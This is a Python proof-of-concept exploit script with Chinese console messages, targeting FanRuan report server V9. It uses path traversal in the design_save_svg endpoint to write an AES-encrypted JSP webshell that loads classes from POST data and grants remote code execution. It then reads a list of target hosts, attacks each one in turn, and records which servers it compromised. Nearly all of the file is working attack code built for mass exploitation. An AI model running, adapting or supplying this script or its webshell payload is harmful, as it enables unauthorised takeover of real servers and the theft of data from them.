import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion: 帆软OA V9 getshell                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mFile        >>> ip.txt                                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url_1 = target_url + "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/index1.jsp"
    print('\033[36m[o] 正在请求: {}'.format(vuln_url_1))
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = '''{"__CONTENT__":"<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>","__CHARSET__":"UTF-8"}'''
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url=vuln_url_1, headers=headers, timeout=5, data=data, verify=False)
    webshell_url = target_url + "/WebReport/index1.jsp"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=webshell_url, timeout=5, verify=False, headers=headers)
        if response.status_code == 200 :
            with open('webshell.txt', 'a', encoding='utf8') as vu:
                vu.write("目标 {} 被上传木马: {}/WebReport/index1.jsp\n".format(target_url, target_url))
                print("\033[32m[+] 目标 {} 被上传木马: {}/WebReport/index1.jsp \033[0m".format(target_url, target_url))
    except Exception as e:
        print("\033[31m[x] 请求报错 \033[0m".format(e))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
                url = url.strip('\n')
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                req = requests.get(url=url, headers=headers, verify=False, timeout=5)
                if req.status_code == 200:
                    print("\033[32m[+] 正在请求{}".format(url))
                else:
                    url = url.replace("http","https")
                    req = requests.get(url=url, headers=headers, verify=False, timeout=5)
                    if req.status_code == 200:
                        print("\033[32m[+] 正在请求{}".format(url))
                    else:
                        pass
            except Exception as e:
                print("\033[31m[x] "+url+"访问失败 \033[0m".format(e))
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] "+url+"请求报错 \033[0m".format(e))
                continue
if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
    Scan(file_name)
